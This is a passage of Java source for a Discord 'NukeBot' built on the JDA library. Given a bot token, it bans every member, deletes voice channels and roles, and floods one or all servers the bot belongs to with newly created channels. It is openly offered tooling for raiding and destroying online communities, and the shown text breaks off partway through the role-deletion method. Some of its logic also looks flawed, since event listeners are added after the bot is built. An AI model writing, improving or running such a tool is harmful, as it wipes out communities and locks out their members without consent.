import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.VoiceChannel;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import javax.security.auth.login.LoginException;
import java.util.Scanner;

public class NukeBot extends ListenerAdapter {
    private static final Scanner scanner = new Scanner(System.in);
    private static String name;

    public static void main(String[] args) {
        System.out.println("Nuke Bot");
        System.out.println("Made by: https://github.com/Sigma-cc");

        while (true) {
            clearConsole();
            System.out.println("Menu");
            System.out.println("[1] Run Setup Nuke Bot");
            System.out.println("[2] Exit");
            System.out.print("====> ");
            String choice = scanner.nextLine();

            if (choice.equals("1")) {
                System.out.print("Input bot token: ");
                String token = scanner.nextLine();
                System.out.print("Input name for created channels / roles: ");
                name = scanner.nextLine();
                clearConsole();

                System.out.println("Select");
                System.out.println("[1] Nuke of all servers.");
                System.out.println("[2] Nuke only one server.");
                System.out.println("[3] Exit");
                System.out.print("====> ");
                String choiceType = scanner.nextLine();

                JDABuilder builder = JDABuilder.createDefault(token);
                builder.addEventListeners(new NukeBot());

                try {
                    builder.build();
                } catch (LoginException e) {
                    e.printStackTrace();
                    continue;
                }

                if (choiceType.equals("1")) {
                    builder.addEventListeners(new ListenerAdapter() {
                        @Override
                        public void onReady(ReadyEvent event) {
                            System.out.println("[+] Logged in as " + event.getJDA().getSelfUser().getName());
                            System.out.println("[+] Bot in " + event.getJDA().getGuilds().size() + " servers!");
                            for (Guild guild : event.getJDA().getGuilds()) {
                                nukeGuild(guild);
                            }
                        }
                    });
                } else if (choiceType.equals("2")) {
                    System.out.print("Input server id: ");
                    String guildId = scanner.nextLine();
                    builder.addEventListeners(new ListenerAdapter() {
                        @Override
                        public void onReady(ReadyEvent event) {
                            for (Guild guild : event.getJDA().getGuilds()) {
                                if (String.valueOf(guild.getIdLong()).equals(guildId)) {
                                    nukeGuild(guild);
                                }
                            }
                        }
                    });
                } else if (choiceType.equals("3")) {
                    System.out.println("Exit...");
                    System.exit(0);
                }
            } else if (choice.equals("2")) {
                System.out.println("Exit...");
                System.exit(0);
            }
        }
    }

    private static void nukeGuild(Guild guild) {
        System.out.println("Nuke: " + guild.getName());
        int banned = banAllMembers(guild);
        System.out.println("Banned: " + banned);
        int deletedChannels = deleteAllChannels(guild);
        System.out.println("Deleted Channels: " + deletedChannels);
        int deletedRoles = deleteAllRoles(guild);
        System.out.println("Deleted Roles: " + deletedRoles);
        int createdChannels = createVoiceChannels(guild, name);
        System.out.println("Created Voice Channels: " + createdChannels);
        System.out.println("--------------------------------------------\n");
    }

    private static int banAllMembers(Guild guild) {
        int banned = 0;
        for (Member member : guild.getMembers()) {
            try {
                guild.ban(member, 0).queue();
                banned++;
            } catch (Exception e) {
                // Handle exception
            }
        }
        return banned;
    }

    private static int deleteAllChannels(Guild guild) {
        int deleted = 0;
        for (VoiceChannel channel : guild.getVoiceChannels()) {
            try {
                channel.delete().queue();
                deleted++;
            } catch (Exception e) {
                // Handle exception
            }
        }
        return deleted;
    }

    private static int deleteAllRoles(Guild guild) {
        int deleted = 0;
        for (Role role : guild.getRoles()) {
           
